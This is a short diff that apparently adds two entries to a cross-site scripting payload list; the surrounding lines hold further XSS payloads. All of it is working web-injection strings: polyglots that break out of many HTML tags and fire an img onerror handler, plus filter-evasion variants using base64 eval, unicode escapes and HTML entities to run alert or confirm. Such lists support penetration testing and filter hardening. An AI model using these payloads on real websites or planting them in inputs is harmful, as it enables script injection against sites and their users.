@@ -142,3 +142,5 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/on
 <img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
 <img src="x" onerror="\u0061\u006c\u0065\u0072\u0074(1)">
 <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
